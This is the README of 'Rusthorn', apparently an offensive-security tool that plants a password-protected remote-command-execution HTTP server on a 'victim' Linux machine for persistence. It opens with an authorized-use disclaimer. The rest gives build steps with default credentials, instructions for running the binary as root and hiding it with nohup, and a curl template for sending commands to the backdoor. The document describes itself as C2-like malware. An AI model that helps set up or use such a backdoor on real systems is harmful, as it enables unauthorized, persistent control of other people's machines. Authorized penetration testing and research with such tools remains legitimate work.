# Rusthorn

This tool facilitates persistence via creating a password-protected RCE-vulnerable HTTP server.


## A Note & Disclaimer on Risk, Legality and Ethicality
**Rusthorn** is a powerful tool that can be used to facilitate persistence via a password-protected remote code execution (RCE) vulnerability. However, it is important to note that this tool **behaves similarly to command-and-control (C2) malware**, and its usage on any system without explicit authorization is **illegal and unethical**.

This tool was designed for educational purposes and is intended to be used only in controlled environments where you have proper authorization. This includes security research, penetration testing with permission, and similar ethical use cases. **It is imperative that you understand the legal and ethical implications of using such tools**.

**This tool must NEVER be used for for-profit reasons or military applications**.

Using this tool on unauthorized systems is a violation of the law and can lead to serious consequences. Additionally, deploying it on your personal network or any environment that is not properly secured could expose your systems to significant security risks, including data breaches or full-system compromise.

Please use this tool responsibly.
## Setup

You will need an attacker machine that can run cargo (or precompile your binary on such a machine) and a victim machine where you have root auth level.
This tool runs by default on Linux x86-x64. It's possible to compile this code for other devices with the proper documentation.

First of all clone the repo:

``` bash
git clone https://github.com/XoanOuteiro/rusthorn
```

Then you will need to modify the PSSWD and PORT constants on /src/main.rs:

``` rust
// constants for auth, configs
const PSSWD: &str = "supersecret"; // change this before compile
const PORT: u16 = 11312; // change this before compile
```

(These are the default values)

Then go back to the root folder and run:

``` bash
cargo build --release
```

Your binary will be ready at /target/release/rusthorn
In the future, a compiler script will be implemented to avoid these steps.


## Usage

Transfer the binary to the victim's computer and run it as root:

``` bash
chmod +x (pathToRusthorn)
./rusthorn &
```

You may also want to run it via nohup:

``` bash
nohup ./rusthorn &> /dev/null &
```

## Interaction

By default your backdoor will be running at 0.0.0.0 in the victim machine, meaning it should be reachable from any net its interfaces are connected to.
You can easily interact with your backdoor via curl, remember to pass your password or your commands will be rejected. You may use this template:

``` bash
curl -b "pswd=[PASSWORD]" http://[ip]:[PORT]/[command]
```

Rusthorn interprets "+" in the URL as whitespace, so that character may be used if a command requires whitespaces to add flags.
